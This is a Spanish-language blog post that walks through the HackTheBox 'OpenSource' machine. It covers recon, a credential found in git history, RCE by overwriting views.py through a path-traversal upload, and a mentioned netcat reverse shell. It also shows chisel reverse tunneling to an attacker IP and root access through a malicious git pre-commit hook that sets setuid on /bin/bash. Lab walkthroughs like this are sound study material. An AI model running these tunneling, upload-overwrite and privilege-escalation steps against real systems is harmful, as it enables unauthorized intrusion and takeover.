---
layout: post
title: "Write Up OpenSource. "
subtitle: "Starting-Point"
category: Blog
tags: [Easy,Linux,Github,LFI,RCE,Chisel,CronJob,SSTI,XXE,Web,Vulnerability-Assessment,Source-Code-Analysis,Security-Tools,Git,Metasploit,Flask,Docker,Gitea,Chisel,Python,Reconnaissance,Tunneling,Password-Reuse,Port-Forwarding,Scheduled-Job-Abuse,Arbitrary-File-Upload,Directory-Traversalt,eWPT,eWPTxv2,OSWE,OSCP,eCPPTv2] 
image:
  path: /assets/img/opensource/opensource.png
---

***
<!--more-->

1. this ordered seed list will be replaced by the toc
{:toc}

***

## Reconnaissance


### nmap


```bash
nmap -p- --open --min-rate 5000 -sS -n -vvv -Pn 10.10.11.164 -oA allports
```


![list](/assets/img/opensource/Parrot-SO3-2022-08-24-16-10-05.png){:.lead width="800" height="100" loading="lazy"}

***

### Services and Versions


```bash
nmap -p22,8080 -sV -sC 10.10.11.170 -oN target
```

***

## Vulnerability Analysis


### HTTP TCP-80


Uso de Investigacion web, Google Hacking,Google Dorks y recopilación de información gracias a servicios de terceros e ispeccionamos la web.


Inpeccionamos las tecnologias de la ip ataves de la terminal o via  web esto lo hacemos con wapalizzer o whatweb.


![list](/assets/img/opensource/Parrot-SO3-2022-08-24-16-07-07.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
En una seccion de la web podemos cargar un archivo. 


Whatweb identificar tecnologuias atraves del terminal o wappalizer atraves de la web.


![list](/assets/img/opensource/Parrot-SO3-2022-08-24-16-06-20.png){:.lead width="800" height="100" loading="lazy"}


Nos descargamos el codigo fuente que encontramos al inspeccionar la web.


![list](/assets/img/opensource/1.png){:.lead width="800" height="100" loading="lazy"}


Descomprimimos el zip y encontramos que hay un directorio .git, y buscando entre branchs y commits encontramos credenciales.


![list](/assets/img/opensource/Kali-2022-08-25-16-22-37.png){:.lead width="800" height="100" loading="lazy"}



{:.note}
Encontramos una credencial `dev01:Soulless_Developer#2022`. 


Si seguimos mirando en app/app/ hay un archivo views.py que es el que almacena las funciones ademas guindonos por las funciones de arriba podemos definir nuestra propia función y agregarla al final para mas adelante subirla y ejecutar comandos.


![list](/assets/img/opensource/Parrot-SO3-2022-08-24-17-48-36.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
De esta forma  podremos ver el /etc/host y tambien el /.ssh/id_rsa. 


Lo subimos desde `http://10.10.11.164/upload` pero interceptaremos con burpsuite y cambiaremos la ruta a `/app/app/views.py` para sobreescribir el actual de la máquina y damos a forward.


![list](/assets/img/opensource/Parrot-SO3-2022-08-24-18-54-52.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Si todo salió bien la función deberia de funcionar entonces nos haremos una reverse shell con `nc mkfifo`, urlencodeando lo que pueda dar problemas,levantamos un listener en el puerto 443.


Tenenos shell como root en un contenedor, pero ahora tenemos conexión con el puerto 3000 de la maquina real que veiamos filtered, asi que subiremos chisel y enviaremos el puerto a nuestro equipo local.


```bash
chisel server --reverse --port 8000
```


{:.note}
Esto en la maquina atacante.


```bash
./chisel client 10.10.16.31:8000 R:3000:172.17.0.1:3000
```


{:.note}
Esto en la maquina victima.


Si abrimos en el navegador el localhost en el puerto 3000 vemos un panel de gitea podemos 
usar las credenciales que encontramos al inicio `dev01:Soulless_Developer#2022`.


{:.note}
Ya como dev01 podemos ver un repositorio "home-backup" que tiene unas claves ssh que podemos probar para conectarnos.


![list](/assets/img/opensource/Kali-2022-08-25-16-37-32.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Buscamos la flag de en el escritorio.


***

## Explotation


Siempre es bueno ejecutar `LimEnum` Y `pspy` para monitorizar y ver los posibles vectores para escalar de privilegios, ademas hasta que se ejecute los anteriores podemos buscar los permisos con el comado find con el siguite comado.


En [gtfobins] vemos un ejemplo abusando del pre-commit, podemos intentarlo y después de un minuto nos convertimos en root.


[gtfobins]: https://gtfobins.github.io/gtfobins/git/


```bash
echo "chmod u+s /bin/bash" >> ~/.git/hooks/pre-commit
```


{:.note}
Le damos permiso setuid.


```bash
chmod +x !$
```


{:.note}
Le damos permisos de ejecucion.


```bash
bash -p
```


{:.note}
Ya somos root, buscamos la flag en el escritorio del root.


***

```shell
🎉 Felicitaciones ya has comprometido OpenSource de HackTheBox 🎉
```
{:.centered}
***

Back to [Certification eWPT](2023-07-04-Road-to-eWPT.md){:.heading.flip-title}
{:.read-more}

***

Back to [Certification eCPPTv2](2023-07-06-Road-to-eCPPTv2.md){:.heading.flip-title}
{:.read-more}

***

Back to [Certification OSCP](2023-07-10-Road-to-OSCP.md){:.heading.flip-title}
{:.read-more}

***
Back to [Certification OSWE](){:.heading.flip-title}
{:.read-more}

